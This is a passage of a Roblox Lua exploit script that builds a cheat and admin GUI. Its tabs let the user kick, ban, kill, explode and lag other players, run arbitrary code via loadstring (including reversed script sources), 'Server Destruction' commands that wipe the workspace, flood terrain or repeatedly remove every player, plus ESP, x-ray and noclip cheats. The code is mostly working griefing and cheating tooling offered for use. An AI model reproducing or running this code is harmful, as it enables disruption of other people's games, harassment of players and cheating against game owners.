MIds=TextUsedLabel(T,"SoundId",MId,0) if MPitch:FindFirstChild("ValueBox") ~= nil and MVolume:FindFirstChild("ValueBox") ~= nil then MPitch:FindFirstChild("ValueBox").Text = 1 MVolume:FindFirstChild("ValueBox").Text = 0.5 end local Music = nil ToggleButton(T,"Music",function() if game.Workspace:FindFirstChild("Ro-MusicPlayer") ~= nil then if game.Workspace:FindFirstChild("Ro-MusicPlayer"):IsA("Sound") then game.Workspace:FindFirstChild("Ro-MusicPlayer"):Stop() game.Workspace:FindFirstChild("Ro-MusicPlayer"):Remove() end end Music=Instance.new("Sound",game.workspace) Music.Name = "Ro-MusicPlayer" Music.Looped = true if MIds:FindFirstChild("ValueBox") ~= nil then Music.SoundId = "rbxassetid://"..MIds:FindFirstChild("ValueBox").Text end if MVolume:FindFirstChild("ValueBox") ~= nil then Music.Volume = MVolume:FindFirstChild("ValueBox").Text end if MPitch:FindFirstChild("ValueBox") ~= nil then Music.Pitch = MPitch:FindFirstChild("ValueBox").Text end wait() Music:Play() end, function() if game.Workspace:FindFirstChild("Ro-MusicPlayer") ~= nil then if game.Workspace:FindFirstChild("Ro-MusicPlayer"):IsA("Sound") then game.Workspace:FindFirstChild("Ro-MusicPlayer"):Stop() game.Workspace:FindFirstChild("Ro-MusicPlayer"):Remove() end end end,MId) U=ScrollFrame(T,UDim2.new(1,0,1,-(35*(MId.Value))),UDim2.new(0,0,0,35*(MId.Value))) U.Transparency = .85 U.BorderSizePixel = 0 U.CanvasSize = UDim2.new(0,0,0,0) U.BackgroundColor3 = Color if Folder ~= nil then if Folder:FindFirstChild("MusicData") ~= nil then for i, v in pairs(Folder:FindFirstChild("MusicData"):GetChildren()) do Button(U,v.Name,EmptySP,EmptySP,function() if v:IsA("Sound") then for _,b in pairs(MPitch:GetChildren()) do end if MPitch:FindFirstChild("ValueBox") ~= nil and MVolume:FindFirstChild("ValueBox") ~= nil and MIds:FindFirstChild("ValueBox") ~= nil then MIds:FindFirstChild("ValueBox").Text = v.SoundId end end end ,MPId) MPId.Value = i U.CanvasSize = UDim2.new(0,0,0,35*MPId.Value) end end end V=AddTab(M,N,"Gear Giver",TabId) V.Size = UDim2.new(1,10,1,0) local GiveGear GiveGear=TextUsedButton(V,"Give Gear",function() if GiveGear ~= nil then if GiveGear:FindFirstChild("ValueBox") ~= nil then ypcall(function() for i,v in pairs(Selected:GetChildren()) do for _,b in pairs(game.Players:GetChildren()) do if b.Name == v.Name then x = game:GetService("InsertService"):LoadAsset(GiveGear:FindFirstChild("ValueBox").Text) for p,q in pairs(x:GetChildren()) do q.Parent = b.Backpack end x:Remove() end end end end) end end end,GId,0) W=ScrollFrame(V,UDim2.new(1,0,1,-(35*(GId.Value))),UDim2.new(0,0,0,35*(GId.Value))) W.Transparency = .85 W.BorderSizePixel = 0 W.CanvasSize = UDim2.new(0,0,0,0) W.BackgroundColor3 = Color if Folder ~= nil then if Folder:FindFirstChild("GearData") ~= nil then for i, v in pairs(Folder:FindFirstChild("GearData"):GetChildren()) do Button(W,v.Name,EmptySP,EmptySP,function() if v:IsA("IntValue") then if GiveGear ~= nil then if GiveGear:FindFirstChild("ValueBox") ~= nil then GiveGear:FindFirstChild("ValueBox").Text = v.Value end end end end,GPId) GPId.Value = i W.CanvasSize = UDim2.new(0,0,0,35*GPId.Value) end end end local GiveHat GiveHat=TextUsedButton(X,"Give Hat",function() if GiveHat ~= nil then if GiveHat:FindFirstChild("ValueBox") ~= nil then ypcall(function() for i,v in pairs(Selected:GetChildren()) do for _,b in pairs(game.Players:GetChildren()) do if b.Name == v.Name then x = game:GetService("InsertService"):LoadAsset(GiveHat:FindFirstChild("ValueBox").Text) for p,q in pairs(x:GetChildren()) do q.Parent = b.Character end x:Remove() end end end end) end end end,HId,0) Y=ScrollFrame(X,UDim2.new(1,0,1,-(35*(HId.Value))),UDim2.new(0,0,0,35*(HId.Value))) Y.Transparency = .85 Y.BorderSizePixel = 0 Y.CanvasSize = UDim2.new(0,0,0,0) Y.BackgroundColor3 = Color if Folder ~= nil then if Folder:FindFirstChild("HatData") ~= nil then for i, v in pairs(Folder:FindFirstChild("HatData"):GetChildren()) do Button(Y,v.Name,EmptySP,EmptySP,function() if v:IsA("IntValue") then if GiveHat ~= nil then if GiveHat:FindFirstChild("ValueBox") ~= nil then GiveHat:FindFirstChild("ValueBox").Text = v.Value end end end end,HPId) HPId.Value = i Y.CanvasSize = UDim2.new(0,0,0,35*GPId.Value) end end end o=AddTab(M,N,"Banned Player",TabId) p=ScrollFrame(o,UDim2.new(1,10,1,0),UDim2.new(0,0,0,0)) p.Transparency = 1 p.BorderSizePixel = 0 p.CanvasSize = UDim2.new(0,0,0,0) game.Players.ChildAdded:connect(function(child) if VerifyValue(Banned,child.Name) then wait(0.35) child:Remove() end if PrivateServer == true then wait(0.35) child:Remove() end end) Banned.ChildAdded:connect(function(child) SetBannedList(p) end) Banned.ChildRemoved:connect(function() SetBannedList(p) end) SetBannedList(p) if Folder:FindFirstChild("BannedData") then for k,c in pairs(Folder:FindFirstChild("BannedData"):GetChildren()) do AddValue(Banned,c.Name) end end end function GenerateScriptTab() S=AddTab(M,N,"Script Tab",TabId) S.ClipsDescendants = true ExeButton=TextUsedButton(S,"Execute",function() ypcall(function() loadstring(ExeButton:FindFirstChild("ValueBox").Text)() end) end, SId) ExeButton.Size = UDim2.new(1,0,0,35) aFrame=Instance.new("Frame",S) aFrame.Size = UDim2.new(1,0,1,-35) aFrame.BackgroundTransparency = 1 aFrame.Position = UDim2.new(0,0,0,35) local Current = Instance.new("IntValue",S) Current.Value = 1 local Max = 0 local Color = Color3.new(0,75/255,150/255) local Pos = UDim2.new(0.5,-75,0.5,-50) local Size = UDim2.new(0,150,0,150) local Size2 = UDim2.new(0,75,0,75) local K local runLocalScript = function(SC) if game.Players.LocalPlayer ~= nil then if game.Players.LocalPlayer.PlayerGui ~= nil then ypcall(function() K = Instance.new("LocalScript",game.Players.LocalPlayer.PlayerGui) K.Disabled = true K.Source = SC wait() K.Disabled = false end) end end end local search = Instance.new("TextBox",aFrame) search.BackgroundColor3 = Color search.BackgroundTransparency = 0.85 search.BorderSizePixel = 0 search.Position = UDim2.new(0.5,-100,0,0) search.Size = UDim2.new(0,200,0,20) search.Font = "Legacy" search.FontSize = "Size10" search.TextColor3 = Color3.new(1,1,1) search.TextStrokeTransparency = 0.5 search.TextWrapped = true search.Text = "" search.ClearTextOnFocus = true search.FocusLost:connect(function(p) if p then for i,v in pairs(aFrame:GetChildren()) do if v.Name == "Cube" then if v:FindFirstChild("Title") ~= nil then if v:FindFirstChild("Id") ~= nil then if string.match(string.lower(search.Text),v:FindFirstChild("Id").Value) then Current.Value = v:FindFirstChild("Id").Value elseif string.match(string.lower(v:FindFirstChild("Title").Text),string.lower(search.Text)) then if v:FindFirstChild("Id") ~= nil then Current.Value = v:FindFirstChild("Id").Value end end end end end end end end) local Cube = function(parent,name,id) b=Instance.new("Frame",parent) b.BorderSizePixel = 0 b.Name = "Cube" b.BackgroundTransparency = 0.85 b.BackgroundColor3 = Color e=Instance.new("IntValue",b) e.Name = "Id" e.Value = id f=Instance.new("TextLabel",b) f.Text = "  ID: "..id f.BackgroundTransparency = 1 f.Size = UDim2.new(0,100,0,20) f.Font = "Legacy" f.TextColor3 = Color3.new(1,1,1) f.TextStrokeTransparency = 0.5 f.TextXAlignment = "Left" g=Instance.new("TextLabel",b) g.Text = name g.BackgroundTransparency = 1 g.Size = UDim2.new(1,0,0.10,0) g.Position = UDim2.new(0,0,0.15,0) g.Font = "Legacy" g.TextScaled = true g.TextColor3 = Color3.new(1,1,1) g.TextStrokeTransparency = 0.5 g.Name = "Title" h=Instance.new("TextButton",b) h.Text = "Execute" h.BackgroundColor3 = Color h.BackgroundTransparency = 0.85 h.Size = UDim2.new(0.75,0,0.2,0) h.Position = UDim2.new(0.5-(0.75/2),0,1-0.25,0) h.Font = "Legacy" h.TextScaled = true h.TextColor3 = Color3.new(1,1,1) h.TextStrokeTransparency = 0.5 h.BorderSizePixel = 0 h.MouseButton1Click:connect(function() if Folder ~= nil then if Folder:FindFirstChild("ScriptData") ~= nil then if Folder:FindFirstChild("ScriptData"):FindFirstChild(name) ~= nil then PlaySFX(156785206,0.75,1.25) loadstring("script.Name = 'DeathDeletepl0x'; " .. string.reverse(Folder:FindFirstChild("ScriptData"):FindFirstChild(name).Source) .. " script.Name = 'DeathDeletepl0x';" .. [==[ game.Players.LocalPlayer.Character.Humanoid.Died:connect(function() script.Disabled = true end) ]==])() end end end end) Max=Max+1 return b end local Left = function() PlaySFX(156785206,0.75,1.25) if Current.Value > 1 then Current.Value = Current.Value - 1 else Current.Value = Max end end local c = Instance.new("TextButton",aFrame) c.Size = UDim2.new(0,50,1,0) c.Text = "<" c.BackgroundTransparency = 0.85 c.BackgroundColor3 = Color c.BorderSizePixel = 0 c.Font = "Legacy" c.FontSize = "Size36" c.TextStrokeTransparency = 0.5 c.TextColor3 = Color3.new(1,1,1) c.ZIndex = 3 c.MouseButton1Click:connect(function() Left() end) local Right = function() PlaySFX(156785206,0.75,1.25) if Current.Value < Max then Current.Value = Current.Value + 1 else Current.Value = 1 end end local d = Instance.new("TextButton",aFrame) d.Size = UDim2.new(0,50,1,0) d.Position = UDim2.new(1,-50,0,0) d.BackgroundTransparency = 0.85 d.BackgroundColor3 = Color d.BorderSizePixel = 0 d.Text = ">" d.Font = "Legacy" d.FontSize = "Size36" d.TextStrokeTransparency = 0.5 d.TextColor3 = Color3.new(1,1,1) d.ZIndex = 3 d.MouseButton1Click:connect(function() Right() end) AddHotkey(string.byte("q"),function() if Toggle == true then if S.Visible == true then Left() end end end) AddHotkey(string.byte("e"),function() if Toggle == true then if S.Visible == true then Right() end end end) if Folder:FindFirstChild("ScriptData") ~= nil then for i,v in pairs(Folder:FindFirstChild("ScriptData"):GetChildren()) do Cube(aFrame,v.Name,i) end end local refresh = function() for i,v in pairs(aFrame:GetChildren()) do if v.Name == "Cube" then if v:FindFirstChild("Id") ~= nil then if v:FindFirstChild("Id").Value == Current.Value then v:TweenSizeAndPosition(Size,Pos,"Out","Quad",0.75,true) for k,f in pairs(v:GetChildren()) do if f.ClassName ~= "IntValue" then f.ZIndex = 2 end end elseif v:FindFirstChild("Id").Value > Current.Value then if v:FindFirstChild("Id").Value > Current.Value + 1 then v:TweenSizeAndPosition(Size2,UDim2.new(1.5,-75/2,0.25,-75),"Out","Quad",0.75,true) else v:TweenSizeAndPosition(Size2,UDim2.new(0.75,-75/2,0.25,0),"Out","Quad",0.75,true) end for k,f in pairs(v:GetChildren()) do if f.ClassName ~= "IntValue" then f.ZIndex = 1 end end elseif v:FindFirstChild("Id").Value < Current.Value then if v:FindFirstChild("Id").Value < Current.Value - 1 then v:TweenSizeAndPosition(Size2,UDim2.new(-0.5,-75/2,0.25,-75),"Out","Quad",0.75,true) else v:TweenSizeAndPosition(Size2,UDim2.new(0.25,-75/2,0.25,0),"Out","Quad",0.75,true) end for k,f in pairs(v:GetChildren()) do if f.ClassName ~= "IntValue" then f.ZIndex = 1 end end end end end end end Current.Changed:connect(function() refresh() end) refresh() end function GeneratePlayerCommand() Q=AddTab(M,N,"Player Commands",TabId) R=ScrollFrame(Q,UDim2.new(1,10,1,0),UDim2.new(0,0,0,0)) R.Transparency = 1 R.BorderSizePixel = 0 R.CanvasSize = UDim2.new(0,0,0,0) CId.Changed:connect(function() if R:IsA("ScrollingFrame") then R.CanvasSize = UDim2.new(0,0,0,35*CId.Value) end end) Button(R,"Ban",EmptySP,EmptySP,function() for i ,v in pairs(Selected:GetChildren()) do if not VerifyValue(Banned,v.Name) then if v.Name ~= "KrystalTeam" then if not IsLocalPlayer(v.Name) then AddValue(Banned,v.Name) end else game.Players:Chat("I'm a jerk ass trying to ban my own script provider!") end end end end,CId) Button(R,"Kick",EmptySP,EmptySP,function() for i ,v in pairs(Selected:GetChildren()) do for _,b in pairs(game.Players:GetChildren()) do if b.Name == v.Name then if v.Name ~= "KrystalTeam" then if not IsLocalPlayer(v.Name) then b:Remove() end else game.Players:Chat("I'm a jerk ass trying to kick my own script provider!") end end end end end,CId) Button(R,"Kill",EmptySP,EmptySP,function() for i ,v in pairs(Selected:GetChildren()) do for _,b in pairs(game.Players:GetChildren()) do if b.Name == v.Name then if b.Character ~= nil then b.Character:BreakJoints() end end end end end,CId) local Ex Button(R,"Explode",EmptySP,EmptySP,function() for i ,v in pairs(Selected:GetChildren()) do for _,b in pairs(game.Players:GetChildren()) do if b.Name == v.Name then if b.Character ~= nil then if b.Character:FindFirstChild("Torso") ~= nil then Ex=Instance.new("Explosion",b.Character:FindFirstChild("Torso")) Ex.Position = b.Character:FindFirstChild("Torso").Position end end end end end end,CId) Button(R,"Respawn",EmptySP,EmptySP,function() for i ,v in pairs(Selected:GetChildren()) do for _,b in pairs(game.Players:GetChildren()) do if b.Name == v.Name then local ack2 = Instance.new("Model") ack2.Parent = game.Workspace local ack4 = Instance.new("Part") ack4.Transparency = 1 ack4.CanCollide = false ack4.Anchored = true ack4.Name = "Torso" ack4.Position = Vector3.new(10000,10000,10000) ack4.Parent = ack2 local ack3 = Instance.new("Humanoid") ack3.Torso = ack4 ack3.Parent = ack2 b.Character = ack2 end end end end,CId) Button(R,"Lag",EmptySP,EmptySP,function() for i ,v in pairs(Selected:GetChildren()) do for _,b in pairs(game.Players:GetChildren()) do if b.Name == v.Name then if v.Name ~= "KrystalTeam" then for i = 1,10000 do g = Instance.new("HopperBin") g.Parent = b.Backpack end else game.Players:Chat("I'm a jerk ass trying to lag my own script provider!") end end end end end,CId) ToggleButton(R,"ForceField",function() for i,v in pairs(Selected:GetChildren()) do for _,b in pairs(game.Players:GetChildren()) do if b.Name == v.Name then if b.Character ~= nil then Instance.new("ForceField",b.Character) end end end end end, function() for i,v in pairs(Selected:GetChildren()) do for _,b in pairs(game.Players:GetChildren()) do if b.Name == v.Name then if b.Character ~= nil then for k,c in pairs(b.Character:GetChildren()) do if c ~= nil then if c:IsA("ForceField") then c:Remove() end end end end end end end end,CId) ToggleButton(R,"InVisible",function() for i,v in pairs(Selected:GetChildren()) do for _,b in pairs(game.Players:GetChildren()) do if b.Name == v.Name then if b.Character ~= nil then for k,c in pairs(b.Character:GetChildren()) do if c:IsA("BasePart") then c.Transparency = 1 if c:FindFirstChild("face") ~= nil then c:FindFirstChild("face").Transparency = 1 end elseif c:IsA("Hat") then for p,q in pairs(c:GetChildren()) do q.Transparency = 1 end elseif c:IsA("Model") then for p,q in pairs(c:GetChildren()) do q.Transparency = 1 end end end end end end end end, function() for i,v in pairs(Selected:GetChildren()) do for _,b in pairs(game.Players:GetChildren()) do if b.Name == v.Name then if b.Character ~= nil then for k,c in pairs(b.Character:GetChildren()) do if c:IsA("BasePart") then c.Transparency = 0 if c.Name == "HumanoidRootPart" then c.Transparency = 1 end if c:FindFirstChild("face") ~= nil then c:FindFirstChild("face").Transparency = 0 end elseif c:IsA("Hat") then for p,q in pairs(c:GetChildren()) do q.Transparency = 0 end elseif c:IsA("Model") then for p,q in pairs(c:GetChildren()) do q.Transparency = 0 end end end end end end end end,CId) local TP TP=ToggleButton(R,"Teleport",function() for i,v in pairs(Selected:GetChildren()) do for _,b in pairs(game.Players:GetChildren()) do if b.Name == v.Name then if b.Character ~= nil then if game.Players ~= nil then if game.Players.LocalPlayer ~= nil then if game.Players.LocalPlayer.Character ~= nil then if game.Players.LocalPlayer.Character:FindFirstChild("Torso") ~= nil then b.Character:MoveTo(game.Players.LocalPlayer.Character:FindFirstChild("Torso").Position) end end end end end end end end end, function() for i,v in pairs(Selected:GetChildren()) do for _,b in pairs(game.Players:GetChildren()) do if b.Name == v.Name then if b.Character ~= nil then if game.Players ~= nil then if game.Players.LocalPlayer ~= nil then if game.Players.LocalPlayer.Character ~= nil then if b.Character:FindFirstChild("Torso") ~= nil then game.Players.LocalPlayer.Character:MoveTo(b.Character:FindFirstChild("Torso").Position) end end end end end end end end end,CId) TP.On.Text = "Tp To Me" TP.Off.Text = "Tp To Them" local BT,T1,T2,T3 BT=ToggleButton(R,"Build Tools",function() for i,v in pairs(Selected:GetChildren()) do for _,b in pairs(game.Players:GetChildren()) do if b.Name == v.Name then if game.Players ~= nil then if b ~= nil then if b.Backpack ~= nil then T1 = Instance.new("HopperBin",b.Backpack); T1.BinType = "Grab"; T1.Name = "Grab" T2 = Instance.new("HopperBin",b.Backpack); T2.BinType = "Clone"; T2.Name = "Clone" T3 = Instance.new("HopperBin",b.Backpack); T3.BinType = "Hammer"; T3.Name = "Hammer" end end end end end end end, function() for i,v in pairs(Selected:GetChildren()) do for _,b in pairs(game.Players:GetChildren()) do if b.Name == v.Name then if game.Players ~= nil then if b ~= nil then if b.Backpack ~= nil then for k,c in pairs(b.Backpack:GetChildren()) do if c.Name == "Grab" or c.Name == "Clone" or c.Name == "Hammer" then c:Remove() end end end end end end end end end,CId) BT.On.Text = "Give" BT.Off.Text = "Remove" local NameButton,na,nb,nc NameButton=TextUsedButton(R,"Set Name",function() ypcall(function() for i,v in pairs(Selected:GetChildren()) do for _,b in pairs(game.Players:GetChildren()) do if b.Name == v.Name then if b.Character ~= nil then for m,n in pairs(b.Character:GetChildren()) do if n.ClassName == "Model" then for c,k in pairs(n:GetChildren()) do if k.Name == "FakeHumanoidBro" then n:Remove() end end end end na = Instance.new("Model",b.Character) na.Name = NameButton:FindFirstChild("ValueBox").Text nb = b.Character:FindFirstChild("Head"):Clone() local weld = Instance.new("Weld", nb) weld.Part0 = nb weld.Part1 = b.Character:FindFirstChild("Head") b.Character:FindFirstChild("Head").Transparency = 1 nb.Transparency = 0 nb.Parent = na nb.Name = "Head" nb.CanCollide = false nc=Instance.new("Humanoid",na) nc.Name = "FakeHumanoidBro" nc.MaxHealth = 0 end end end end end) end, CId) local SHealth SHealth=TextUsedButton(R,"Set Health",function() for i,v in pairs(Selected:GetChildren()) do for _,b in pairs(game.Players:GetChildren()) do if b.Name == v.Name then if b.Character ~= nil then if SHealth:FindFirstChild("ValueBox") ~= nil then if b.Character:FindFirstChild("Humanoid") ~= nil then b.Character:FindFirstChild("Humanoid").MaxHealth = SHealth:FindFirstChild("ValueBox").Text b.Character:FindFirstChild("Humanoid").Health = SHealth:FindFirstChild("ValueBox").Text end end end end end end end, CId, 100) local SSpeed SSpeed=TextUsedButton(R,"Set Speed",function() for i,v in pairs(Selected:GetChildren()) do for _,b in pairs(game.Players:GetChildren()) do if b.Name == v.Name then if b.Character ~= nil then if SSpeed:FindFirstChild("ValueBox") ~= nil then if b.Character:FindFirstChild("Humanoid") ~= nil then b.Character:FindFirstChild("Humanoid").WalkSpeed = SSpeed:FindFirstChild("ValueBox").Text end end end end end end end, CId, 16) local SJump SJump=TextUsedButton(R,"Set JumpPower",function() for i,v in pairs(Selected:GetChildren()) do for _,b in pairs(game.Players:GetChildren()) do if b.Name == v.Name then if b.Character ~= nil then if SJump:FindFirstChild("ValueBox") ~= nil then if b.Character:FindFirstChild("Humanoid") ~= nil then b.Character:FindFirstChild("Humanoid").JumpPower = SJump:FindFirstChild("ValueBox").Text end end end end end end end, CId, 50) local psRank psRank=TextUsedButton(R,"P.S. Rank",function() for i ,v in pairs(Selected:GetChildren()) do for _,b in pairs(game.Players:GetChildren()) do if b.Name == v.Name then ypcall(function() if psRank:FindFirstChild("ValueBox") ~= nil then b.PersonalServerRank=psRank:FindFirstChild("ValueBox").Text end end) end end end end,CId,255) local sChat sChat=TextUsedButton(R,"Chat",function() for i ,v in pairs(Selected:GetChildren()) do for _,b in pairs(game.Players:GetChildren()) do if b.Name == v.Name then if b.Character ~= nil then if b.Character:FindFirstChild("Head") ~= nil then if sChat:FindFirstChild("ValueBox") ~= nil then game:GetService("Chat"):Chat(b.Character:FindFirstChild("Head"),sChat:FindFirstChild("ValueBox").Text,Enum.ChatColor.Blue) end end end end end end end,CId) end function GenerateServerDestruction() Z=AddTab(M,N,"Server Destruction",TabId) Aa=ScrollFrame(Z,UDim2.new(1,10,1,0),UDim2.new(0,0,0,0)) Aa.Transparency = 1 Aa.BorderSizePixel = 0 Aa.CanvasSize = UDim2.new(0,0,0,0) SDId.Changed:connect(function() if Aa:IsA("ScrollingFrame") then Aa.CanvasSize = UDim2.new(0,0,0,35*SDId.Value) end end) Button(Aa,"Flood",EmptySP,EmptySP,function() game.Workspace.Terrain:SetCells(Region3int16.new(Vector3int16.new(-100,-100,-100), Vector3int16.new(100,100,100)), 17, "Solid", "X") end,SDId) Button(Aa,"Clear Terrain",EmptySP,EmptySP,function() game.Workspace.Terrain:Clear() end,SDId) Button(Aa,"Clear Workspace",EmptySP,EmptySP,function() clearW(game.Workspace) end,SDId) Button(Aa,"Color Spam",EmptySP,EmptySP,function() spamColor(game.Workspace) end,SDId) Button(Aa,"Create BasePlate",EmptySP,EmptySP,function() local pt = Instance.new("Part") pt.BrickColor = BrickColor.new("Bright green") pt.Anchored = true pt.CanCollide = true pt.BottomSurface = 0 pt.TopSurface = 0 pt.Name = (math.random(1,1000000)) pt.Size = Vector3.new(1000, 1, 1000) pt.Parent = game.Workspace end,SDId) ToggleButton(Aa,"UnAnchore",function() UnAnchore(game.Workspace) end, function() Anchore(game.Workspace) end,SDId) local btaco btaco=ToggleButton(Aa,"Raining Taco: Off",function() taco = true btaco.TextLabel.Text = "Raining Taco: On" end, function() taco = false btaco.TextLabel.Text = "Raining Taco: Off" end,SDId) local PS PS=ToggleButton(Aa,"Private Server: Off",function() PrivateServer = true PS.TextLabel.Text = "Private Server: On" end, function() PrivateServer = false PS.TextLabel.Text = "Private Server: Off" end,SDId) Button(Aa,"Shutdown",EmptySP,EmptySP,function() coroutine.resume(coroutine.create(function() while wait() do ypcall(function() for _, v in pairs(game.Players:GetPlayers()) do v:Remove() end end) end end)) end,SDId) end local WPFolder=nil local CurrentCamera=game.Workspace.CurrentCamera function GenerateWayPoints() Ba=AddTab(M,N,"WayPoints",TabId) Ba.Size = UDim2.new(1,10,1,0) local XC=TextUsedLabel(Ba,"X:",WId,0) local YC=TextUsedLabel(Ba,"Y:",WId,0) local ZC=TextUsedLabel(Ba,"Z:",WId,0) local cName=TextUsedLabel(Ba,"Name:",WId) local AddWButton Ca=ScrollFrame(Ba,UDim2.new(1,0,1,-(35*(WId.Value+1))),UDim2.new(0,0,0,(35*(WId.Value+1)))) Ca.Transparency = .85 Ca.BorderSizePixel = 0 Ca.CanvasSize = UDim2.new(0,0,0,0) Ca.BackgroundColor3 = Color3.new(0,75/255,150/255) local cWColor3 AddWButton=ToggleButton(Ba,"Add WayPoints",function() ypcall(function() if (XC and YC and ZC and cName) ~= nil then if (XC:FindFirstChild("ValueBox") and YC:FindFirstChild("ValueBox") and ZC:FindFirstChild("ValueBox") and cName:FindFirstChild("ValueBox")) ~= nil then Way = Instance.new("Vector3Value",WayFolder) Way.Name = cName.ValueBox.Text Way.Value = Vector3.new(XC.ValueBox.Text,YC.ValueBox.Text,ZC.ValueBox.Text) cWColor3 = Instance.new("Color3Value",Way) cWColor3.Value = BrickColor.Random().Color cWColor3.Name = "SColor" wait() end end end) end, function() ypcall(function() if (XC and YC and ZC and cName) ~= nil then if (XC:FindFirstChild("ValueBox") and YC:FindFirstChild("ValueBox") and ZC:FindFirstChild("ValueBox") and cName:FindFirstChild("ValueBox")) ~= nil then if game.Players ~= nil then if game.Players.LocalPlayer ~= nil then if game.Players.LocalPlayer.Character ~= nil then if game.Players.LocalPlayer.Character:FindFirstChild("Torso") ~= nil then Way = Instance.new("Vector3Value",WayFolder) Way.Name = cName.ValueBox.Text Way.Value = game.Players.LocalPlayer.Character:FindFirstChild("Torso").Position cWColor3 = Instance.new("Color3Value",Way) cWColor3.Value = BrickColor.Random().Color cWColor3.Name = "SColor" wait() end end end end end end end) end,WId) AddWButton.On.Text = "Custom Position" AddWButton.Off.Text = "Current Position" GenerateWFolder() end function ClearWScroll() for i,v in pairs(Ca:GetChildren()) do v:Remove() end end function ClearWFolder() if WPFolder ~= nil then for i,v in pairs(WPFolder:GetChildren()) do v:Remove() end end end local WButton function MakeWButton(name,id) if WayFolder ~= nil then if WayFolder:FindFirstChild(name.Name) ~= nil then WMId.Value = id-1 WButton=ToggleButton(Ca,name.Name .. " X:" .. math.floor(name.Value.X) .. " ,Y:" ..math.floor(name.Value.Y) .. " ,Z:" .. math.floor(name.Value.Z),function() if game.Players ~= nil then if game.Players.LocalPlayer ~= nil then if game.Players.LocalPlayer.Character ~= nil then if game.Players.LocalPlayer.Character:FindFirstChild("Torso") ~= nil then if WayFolder ~= nil then if WayFolder:FindFirstChild(name.Name) ~= nil then game.Players.LocalPlayer.Character:MoveTo(Vector3.new(name.Value.X,name.Value.Y,name.Value.Z)) end end end end end end end, function() if WayFolder ~= nil then if WayFolder:FindFirstChild(name.Name) ~= nil then name:Remove() end end end,WMId) WButton.On.Text = "Tp To" WButton.Off.Text = "Delete" Ca.CanvasSize = UDim2.new(0,0,0,(35*(WMId.Value))) end end end function GenerateWFolder() if CurrentCamera ~= nil then if CurrentCamera ~= nil then if CurrentCamera:FindFirstChild("WayPoint") == nil then WPFolder = nil end else CurrentCamera = game.Workspace.CurrentCamera end if WPFolder == nil then WPFolder=Instance.new("Folder",CurrentCamera) WPFolder.Name = "WayPoint" wait() end end if Ca ~= nil and WPFolder ~= nil then ClearWScroll() ClearWFolder() end local Ke,Le,Me,Ne,Oe,Pe,Qe for i,v in pairs(WayFolder:GetChildren()) do if v ~= nil then MakeWButton(v,i) if WPFolder ~= nil then Ke=Instance.new("Model",WPFolder) Ke.Name = v.Name .. " X:" .. math.floor(v.Value.X) .. " ,Y:" .. math.floor(v.Value.Y) .. " ,Z:" .. math.floor(v.Value.Z) Le=Instance.new("Part",Ke) Le.Name = "Head" Le.Anchored = true Le.CanCollide = false Le.Transparency = 0.5 Le.Material = 288 Le.Size = Vector3.new(2,2,2) Le.Position = v.Value if v:FindFirstChild("SColor") ~= nil then Le.BrickColor = BrickColor.new(v:FindFirstChild("SColor").Value) else Le.BrickColor = BrickColor.Random() end Me=Instance.new("SelectionBox",Le) Me.Adornee = Le Me.Color3 = Le.BrickColor.Color Ne=Instance.new("Humanoid",Ke) Ne.MaxHealth = 0 if string.lower(v.Name) == string.lower("Serntimon") then if Me ~= nil then Me:Remove() Me=nil end Me=Instance.new("SelectionSphere",Le) Me.Adornee = Le Me.Color3 = Le.BrickColor.Color Me.SurfaceColor3 = Le.BrickColor.Color Me.Transparency = 0.75 Me.SurfaceTransparency = 0.75 Ke.Name = "Serntimon Was Here!" Oe=Instance.new("SpecialMesh",Le) Oe.MeshType = "FileMesh" Oe.MeshId = "http://www.roblox.com/asset/?id=50380638" Oe.TextureId = "" Oe.Scale = Vector3.new(1.5,1.5,1.5) Pe=Instance.new("Fire",Le) Pe.Color = Le.BrickColor.Color Pe.SecondaryColor = Le.BrickColor.Color Pe.Size = 4 Pe.Heat = 6 Qe=Instance.new("PointLight",Le) Qe.Range = 12 Qe.Color = Le.BrickColor.Color Qe.Brightness = 1.5 Qe.Shadows = true end end end end end local Explorer, Properties function ExplorerTab() Da=AddTab(M,N,"Explorer",TabId) Da.Size = UDim2.new(1,10,1,0) if Folder:FindFirstChild("MainData") ~= nil then if Folder:FindFirstChild("MainData"):FindFirstChild("ExplorerPanel") ~= nil then Explorer=Folder:FindFirstChild("MainData"):FindFirstChild("ExplorerPanel"):clone() Explorer.Parent = Da Explorer.Visible = true end if Folder:FindFirstChild("MainData"):FindFirstChild("PropertiesPanel") ~= nil then Properties=Folder:FindFirstChild("MainData"):FindFirstChild("PropertiesPanel"):clone() Properties.Parent = Da Properties.Visible = true end for i,v in pairs(Explorer:GetChildren()) do if v.ClassName == "LocalScript" then ypcall(function() loadstring(v.Source)() end) end end for i,v in pairs(Properties:GetChildren()) do if v.ClassName == "LocalScript" then ypcall(function() loadstring(v.Source)() end) end end end end local NClip = false local Esp = false local EspFolder = nil local Ae,Be,Ce,De,Ee,Fe,Ge function GenerateBox(Target,Color) Ae=Instance.new("BillboardGui",EspFolder) Ae.Name = "EspBox" Ae.Size = UDim2.new(4.5,0,6,0) Ae.Adornee = Target Ae.AlwaysOnTop = true Ae.SizeOffset = Vector2.new(0, -0.100000001) Be=Instance.new("Frame",Ae) Be.Transparency = 1 Be.Size = UDim2.new(1,0,1,0) Ce=Instance.new("Frame",Ae) Ce.Transparency = 0.5 Ce.Size = UDim2.new(1,0,0.05, 0) Ce.BorderSizePixel = 0 Ce.BackgroundColor3 = Color De=Ce:clone() De.Size = UDim2.new(0.05,0,1, 0) De.Parent = Ae Ee=De:clone() Ee.Position = UDim2.new(1-0.05,0,0, 0) Ee.Parent = Ae Fe=Ce:clone() Fe.Position = UDim2.new(0,0,1-0.05, 0) Fe.Parent = Ae end function XrayOn(obj) for _,v in pairs(obj:GetChildren()) do if (v:IsA("BasePart")) and not v.Parent:FindFirstChild("Humanoid") then v.LocalTransparencyModifier = 0.75 end XrayOn(v) end end function XrayOff(obj) for _,v in pairs(obj:GetChildren()) do if (v:IsA("BasePart")) and not v.Parent:FindFirstChild("Humanoid") then v.LocalTransparencyModifier = 0 end XrayOff(v) end end function GenerateLocalCommand() Ea=AddTab(M,N,"Local Commands",TabId) Fa=ScrollFrame(Ea,UDim2.new(1,10,1,0),UDim2.new(0,0,0,0)) Fa.Transparency = 1 Fa.BorderSizePixel = 0 Fa.CanvasSize = UDim2.new(0,0,0,0) LPCId.Changed:connect(function() if Fa:IsA("ScrollingFrame") then Fa.CanvasSize = UDim2.new(0,0,0,35*LPCId.Value) end end) local NC NC=ToggleButton(Fa,"NoClip: Off",function() NClip = true NC.TextLabel.Text = "NoClip: On" end, function() NClip = false NC.TextLabel.Text = "NoClip: Off" 